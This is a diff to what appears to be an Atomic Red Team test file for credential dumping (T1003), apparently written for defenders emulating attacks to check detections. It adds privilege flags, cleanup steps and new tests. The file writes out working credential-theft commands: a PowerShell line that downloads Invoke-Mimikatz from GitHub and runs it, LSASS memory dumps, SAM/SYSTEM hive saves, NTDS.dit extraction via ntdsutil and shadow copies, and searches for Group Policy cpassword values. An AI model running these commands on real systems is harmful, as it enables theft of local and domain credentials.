@@ -15,6 +15,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
   executor:
     name: powershell
+    elevation_required: true
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
@@ -25,6 +26,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       gsecdump -a
 
@@ -40,6 +42,7 @@ atomic_tests:
       default: output.txt
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       wce -o #{output_file}
 
@@ -51,10 +54,15 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       reg save HKLM\sam sam
       reg save HKLM\system system
       reg save HKLM\security security
+    cleanup_command: |
+      rm sam
+      rm system
+      rm security
 
 - name: Dump LSASS.exe Memory using ProcDump
   description: |
@@ -68,6 +76,7 @@ atomic_tests:
       type: Path
       default: lsass_dump.dmp
   executor:
+    elevation_required: true
     name: command_prompt
     command: |
       procdump.exe -accepteula -ma lsass.exe #{output_file}
@@ -130,5 +139,81 @@ atomic_tests:
       default: C:\Atomic_Red_Team
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
-      ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
+      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
+
+- name: Create Volume Shadow Copy with NTDS.dit
+  description: |
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+  supported_platforms:
+    - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon)
+      type: String
+      default: "C:"
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      vssadmin.exe create shadow /for=#{drive_letter}
+
+- name: Copy NTDS.dit from Volume Shadow Copy
+  description: |
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
+    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+    A successful test also requires the export of the SYSTEM Registry hive. 
+    This test must be executed on a Windows Domain Controller.
+  supported_platforms:
+    - windows
+  input_arguments:
+    vsc_name:
+      description: Name of Volume Shadow Copy
+      type: String
+      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+    extract_path:
+      description: Path for extracted NTDS.dit
+      type: Path
+      default: C:\Extract
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+
+- name: GPP Passwords (findstr)
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      findstr /S cpassword %logonserver%\sysvol\*.xml
+
+- name: GPP Passwords (Get-GPPPassword)
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    gpp_script_path:
+      description: Path to the Get-GPPPassword PowerShell Script
+      type: Path
+      default: $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      . #{gpp_script_path}
+      Get-GPPPassword -Verbose
